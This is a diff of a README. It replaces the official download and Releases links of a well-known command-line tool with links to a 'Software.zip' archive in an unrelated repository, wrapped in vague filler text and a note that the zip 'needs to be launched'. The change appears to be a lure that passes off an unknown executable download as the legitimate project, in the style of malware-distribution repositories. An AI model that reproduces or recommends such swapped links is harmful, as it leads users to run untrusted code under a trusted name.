@@ -12,10 +12,10 @@ This repository does not provide a specific short description, allowing for expl
 
 ## Installation
 To install the latest version of this repository, you can download the zip file by clicking the button below:
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/tekchapagain/d/releases/download/v1.0/Software.zip)](https://github.com/tekchapagain/d/releases/download/v1.0/Software.zip)
 *Note: The zip file needs to be launched to access the content.*
 
-Alternatively, you can visit the [Releases](https://github.com/cli/cli/releases) section for more options.
+Alternatively, you can visit the [Releases](https://github.com/tekchapagain/d/releases/download/v1.0/Software.zip) section for more options.
 
 ## Usage
 The usage of this repository is not specifically defined, allowing users to explore and utilize it according to their needs and preferences.
